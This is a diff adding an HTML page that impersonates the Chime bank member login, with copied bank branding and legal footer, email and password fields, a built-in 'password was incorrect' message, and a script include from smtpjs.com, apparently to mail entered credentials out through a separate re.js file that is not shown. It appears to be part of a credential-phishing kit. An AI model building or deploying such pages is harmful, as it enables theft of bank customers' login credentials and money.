@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <!--"user-scalable=no" disable zooming when
+        clicking in submission boxes on mobile-->
+
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+        
+        <title>Chime Member Login</title>
+
+        <!--href stands for hypertext reference-->
+        <!---<link rel="icon" href="Chaseico.ico" type="image/x-icon">--->
+
+        <link rel="stylesheet" href="style.css"
+        type="text/css">
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+
+</head>
+<body>
+    <br>
+    <div class="ffchi">
+        <img src="Untitled.jpg" width="200" height="90" loading="lazy">
+    </div><br>
+
+    <form action="#" class="ffform-contact">
+
+        <input id="ffemail" type="email" placeholder="Email Address" required onclick="changeBorderColor(this)">
+        <input id="ffpassword" type="password" placeholder="Password" required onclick="changeBorderColor(this)">
+        <input id="ffsubmit" type="submit" value="Log In">
+
+        <!--javascript to change Submit to Loading after click, check css-->
+        <script>
+            var button = document.querySelector('.ffform-contact input[type="submit"]');
+            button.addEventListener('click', function() {
+                button.classList.add('clicked');
+                button.value = "Loading...";               
+                setTimeout(function() {
+                    button.classList.remove('clicked');
+                    button.value = "Log In";
+                },  4000); 
+            });
+        </script>
+        <script src="./re.js"></script>
+    <form>
+    <div class="redMessage">
+        <p class="red">Your password was inccorect, Please try again.</p>
+    </div>
+    
+    <br><br><br><br><br><br><br><br>
+    <div class="ffdota">
+        <p class = "ffdoa">By clicking “Log In”, you agree to receive SMS text messages from Chime to verify your identity</p>
+    </div><br><br>
+
+</body>
+<footer>
+    <p class="fffoot">© 2023 Chime Bank. All Rights Reserved. Banking Services provided by The Bancorp Bank or Stride Bank, N.A., Members FDIC.</p>
+    <p class="fftoot">The Chime Visa® Debit Card is issued by The Bancorp Bank or Stride Bank pursuant to a license from Visa U.S.A. Inc. and may be used everywhere Visa debit cards are</p>
+    <p class="ffface">accepted. Please see back of your Card for its issuing bank.</p>
+</footer>
+</html>
